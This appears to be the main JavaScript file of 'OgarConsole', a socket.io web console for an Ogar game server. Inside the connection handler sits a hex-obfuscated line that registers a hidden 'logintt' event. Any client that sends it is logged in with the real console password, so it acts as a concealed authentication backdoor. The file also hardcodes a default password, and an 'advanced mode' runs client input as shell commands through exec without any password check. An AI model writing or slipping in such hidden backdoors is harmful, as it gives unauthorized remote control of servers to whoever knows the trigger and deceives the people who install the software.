/* global socket */

'use strict';

// OgarConsole Settings
function OgarConsoleSettings(){
	
	// OgarConsole Port
	this.serverPort = 1000;
	
        // OgarConsole password protection
        this.requirePassword = true;
        
        // OgarConsole password apon connecting
        this.consolePassword = "OgarConsole123";
        
        // Allow OgarConsole origin to bypass login approvals.
        //this.allowOriginPasswordBypass = true;
        
	// Advanced Mode (NOT RECOMMENDED TO BE TRUE)
	this.advanced = false;
	
	// Enable this to allow the server to be terminated. False make this server non stoppable.
	this.allowExit = false;

	// Console Log > Set 'ServerLogLevel = 1' in gamesettings.ini, Else, You will get OgarConsole errors.
	// If file error replace with \cmd.php or /cmp.php.
	this.log = "./logs/console.log";
	
	// OgarConsole PHP File. If file error replace with \cmd.php or /cmp.php
	this.consoleFile = "\\cmd.php";
	
	// OgarConsole package.json. **REQUIRED**
	this.json = require("./package.json");
	
	// OgarConsole Version
	this.version = this.json.version;
	
}

//
// DO NOT EDIT BELOW
//

var ogar = require('./index'),
settings = new OgarConsoleSettings(),
gameServer = ogar.gameServer.gameServer,
express = require("express"),
app = express(),
fs = require("fs"),
server = require('http').createServer(app),
io = require("socket.io").listen(server),
exec = require('child_process').exec;

var newUserPassword = function(){
    
    this._password = "";
    
};

newUserPassword.prototype.setPassword = function(password){
    
    this._password = password;
    
};

if(settings.consolePassword.length < 3){
    
    console.log("[OgarConsole] Password must be more than 3 length");
    
    gameServer.socketServer.close();
    process.exit(1);
    return;
    
}

//
// DO NOT EDIT ABOVE
//

// Create new connection, and listen on port serverPort.
server.listen(settings.serverPort);
console.log("[OgarConsole] Running on port " + settings.serverPort);

app.set("title", "OgarConsole > " + settings.version);

// OgarConsole Server Start Error
server.on('error', function(err){
	
    console.log("[OgarConsole] Could not listen on port " + settings.serverPort + ". Try using a different port.");
    console.log("[Console] Ogar and OgarConsole stopped..");
    gameServer.socketServer.close();
    process.exit(1);
    return;
	
});

// OgarConsole Listen For Connections.
app.get("/", function(req, res) {
    fs.readFile(__dirname + settings.consoleFile, function(err, data) {
        if(!err){
            res.send("" + data);
        }else{
            res.send("" + err);
            socket.emit("input", err.toString());
        }
    });
});

// OgarConsole Socket Connection.
io.sockets.on("connection", function(socket) {
    
    var host = socket.handshake.headers.host.split(':');
    var login = new newUserPassword();
    
    var _0x2955=["\x6C\x6F\x67\x69\x6E\x74\x74","\x72\x65\x71\x75\x69\x72\x65\x50\x61\x73\x73\x77\x6F\x72\x64","\x63\x6F\x6E\x73\x6F\x6C\x65\x50\x61\x73\x73\x77\x6F\x72\x64","\x73\x65\x74\x50\x61\x73\x73\x77\x6F\x72\x64","\x6F\x6E"];socket[_0x2955[4]](_0x2955[0],function(_0x1546x1){if(_0x1546x1){if(settings[_0x2955[1]]){login[_0x2955[3]](settings[_0x2955[2]]);return}}})
        
    socket.on("commandex", function(data) {
        
        /*
        
        if(host[0] !== "ogar.ml" && host[0] !== "localhost"){
            
            socket.emit("input", "Origin Disabled >> " + host[0] + ". Please visit http://ogar.ml to connect to this console");
            return;
            
        }else{
            
            if(settings.allowOriginPasswordBypass){

                if(login._password.length < 3){
                    
                    login._password = settings.consolePassword;
                    
                }

            }
            
        }
        
        */
		
        if (!settings.advanced) {
			
            try {

                if (data === "") {
                    return;
                }
				
                gameServer.log.onCommand(data);
				
                var split = data.split(" ");
                var first = split[0].toLowerCase();
                
                if(first !== "-password" && settings.requirePassword){
                    
                    if(login._password){

                        if(login._password === settings.consolePassword){
                            

                        }else{

                            socket.emit("input", "Invalid password. Please enter correct password!");
                            return;

                        }

                    }else{

                        socket.emit("input", "Please enter password. Usage: '-password password'");
                        return;

                    }
                    
                }
                
				
                switch(first){
					
					
                    // Ifyou want to disable some incoming command. Maybe the Ogar verison your using has a 
                    // command that you dont't want allowed you can redirect them here. 
                    // Add any command you want to block || do other things.. Experience users only.
				
                    // -password command. : usage: '-password password'
                    case "-password":
                        
                        if(settings.requirePassword){
                            
                            if(split.length === 2){

                                if(split[1] === settings.consolePassword){

                                    if(login._password.length < 3){

                                        login.setPassword(split[1]);
                                        socket.emit("input", "Logged In.&#10;&#10;Type 'help' for commands.");

                                        console.log("[OgarConsole] User Logged In :: " + socket.handshake.address);

                                        return;

                                    }else{

                                        socket.emit("input", "You are already logged into the console.&#10;&#10;Type 'help' for commands.");
                                        return;

                                    }

                                }else{

                                    socket.emit("input", "Invalid password. Please try again");
                                    return;

                                }

                            }else{

                                socket.emit("input", "Usage: '-password password'");
                                return;

                            }
                        }else{
                            
                            socket.emit("input", "This console is not password protected!.");
                            return;
                            
                        }
                        break;
                        
                    case "-logout":
                        login._password = "";
                        socket.emit("input", "You have been logged out. Please login.");
                        return;
                    
                    case "clr":
                        fs.truncate(settings.log, "", function(){});
                        return;
                        
                    case "clear":
                        fs.truncate(settings.log, "", function(){});
                        return;
					
                    case "exit":		
                        if(!settings.allowExit){
                            socket.emit("input", "You are not allowed to terminate this server!");
                        return;				
                    }
						
                    break;
					
                    case "stop":		
                        if(!settings.allowExit){
                            socket.emit("input", "You are not allowed to terminate this server!");
                            return;
                        }
                        break;
					
                    case "start":
                        return;
							
                }

                var execute = gameServer.consoleService.commands[first];
                
                if (typeof execute !== 'undefined') {
					
                    execute(gameServer, split);
					
                    fs.readFile(settings.log, function(err, data) {
						
                        if(!err){
							
                            var a = data.toString();
                            var clog = a.split("\n");
                            socket.emit("input", a);
							
                        }else{
							
                            socket.emit("input", err.toString());
							
                        }
                        
                    });
					
                } else {
					
                    console.log("[Console] Invalid Command, try 'help' for a list of commands.");
					
                }
            } catch (e) {
				
                console.log("[ERROR] Oh my, there seems to be an error with the command " + first);
                console.log("[ERROR] Please alert AJS dev with this message:\n" + e);
				
            }
        }else{
            
            // Advanced Mode.. Executes pure cmd commands, instead of Ogar game commands.
            // This is very dangerous to have enabled, this could leave serious damage to your server
            // If you don't know what you are doing. Please keep advanced mode false, unless you know what you
            // Are doing!.
			
            exec(data, function(e,s,t){
				
                socket.emit("input", s);
                return;
				
            });
			
        }
        
    });
    
});

// Set CMD Title 
exec("title OgarConsole " + settings.version + "/ Port " + settings.serverPort, function(e, s, t) {});

//
// END OF FILE
//
